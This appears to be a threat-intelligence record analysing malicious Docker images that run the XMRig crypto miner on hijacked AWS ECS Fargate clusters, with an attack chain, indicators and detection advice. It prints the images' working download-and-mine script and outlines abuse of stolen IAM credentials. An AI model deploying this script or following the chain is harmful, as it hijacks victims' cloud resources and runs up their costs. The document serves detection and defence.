package_info.package_name: Malicious Docker Images for AWS ECS Crypto Mining
package_info.package_versions: All images uploaded October-November 2023 (see full list of image names in report)
package_info.why_malicious: These container images are explicitly designed to deploy cryptocurrency mining malware (XMRig) on AWS ECS Fargate clusters. The images automate the download and execution of XMRig, hijacking cloud resources for illicit mining, and are distributed at scale via automated AWS API abuse.

malicious_snippets.code_snippet:
APP=app$(shuf -i 1000000-9999999 -n 1)
wget -q https://github.com/xmrig/xmrig/releases/download/v6.14.1/xmrig-6.14.1-linux-x64.tar.gz
tar -zxf xmrig-6.14.1-linux-x64.tar.gz
cd xmrig-6.14.1
mv xmrig $APP
chmod +x $APP
./$APP -a rx/0 -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -p x -t $(nproc --all) -u [bitcoin address]
malicious_snippets.code_behavior: At container runtime, the script downloads the XMRig binary from GitHub, extracts and renames it, sets execute permissions, and launches it to mine cryptocurrency using all available CPU cores, sending mining results to a NiceHash pool with a hardcoded wallet address.

malice_analysis.why_suspicious: The code automates the download and execution of a known crypto miner, XMRig, which is a common tool for illicit resource hijacking in cloud environments.
malice_analysis.violated_expectations: Legitimate container entrypoints should not download and execute external mining software or consume all CPU resources for unauthorized purposes.
malice_analysis.similar_legitimate_use: A legitimate container might download and run a binary as part of a CI/CD build or for dynamic updates, but not for crypto mining.
key_indicators: Automated download of XMRig from GitHub
Execution of mining process using all CPU cores
Hardcoded mining pool and wallet address

malicious_snippets.code_behavior: At container build-time, the Dockerfile sets the time zone to Europe/Moscow, which may indicate the threat actor's geographic preference or origin.

malice_analysis.why_suspicious: Setting a specific time zone in a container image is not inherently malicious, but in the context of mass-produced crypto mining images, it may indicate attacker attribution or operational convenience.
malice_analysis.violated_expectations: Most generic container images do not set a specific time zone unless required for application logic.
malice_analysis.similar_legitimate_use: Some applications require a specific time zone for logging or compliance.
key_indicators: Consistent use of Europe/Moscow time zone across malicious images
No application logic requiring this setting

attack_chain.action: Obtain compromised AWS IAM credentials (via leak or phishing).
Enumerate AWS environment and create new IAM users with administrative privileges for persistence.
attack_chain.leads_to: Establish persistent access and privilege escalation

attack_chain.action: Programmatically create multiple ECS Fargate clusters and register malicious task definitions using Docker images from attacker-controlled Docker Hub accounts.
attack_chain.leads_to: Deployment of malicious containers at scale

attack_chain.action: Launch ECS services to run 25+ tasks per malicious task definition, each pulling and executing the malicious container image.
attack_chain.leads_to: Execution of mining malware across hundreds/thousands of containers

attack_chain.action: At container runtime, /run.sh downloads and executes XMRig, mining cryptocurrency and sending results to the attacker's wallet.
attack_chain.leads_to: Resource hijacking and financial gain for attacker

behavioral_signatures: ECS task definitions referencing suspicious or unknown Docker Hub images
Container entrypoints that download and execute XMRig or other mining software
Spikes in ECS cluster/task creation across multiple regions
High CPU usage in ECS/Fargate tasks with no legitimate workload
file_indicators: Docker images named with patterns like ahnoyp/ak:ma, yzsqbe/ka:si, etc.
network_indicators: Docker Hub pulls from listed malicious image repositories
detection_knowledge.how_to_detect: Monitor ECS task definitions and running containers for references to suspicious Docker Hub images (see IoC list). Inspect container entrypoints for scripts that download and execute XMRig or similar mining software. Alert on spikes in ECS cluster/task creation, especially in unused regions. Monitor for outbound network connections to known mining pools and XMRig download URLs. Correlate with high CPU usage and cost anomalies in ECS/Fargate workloads.
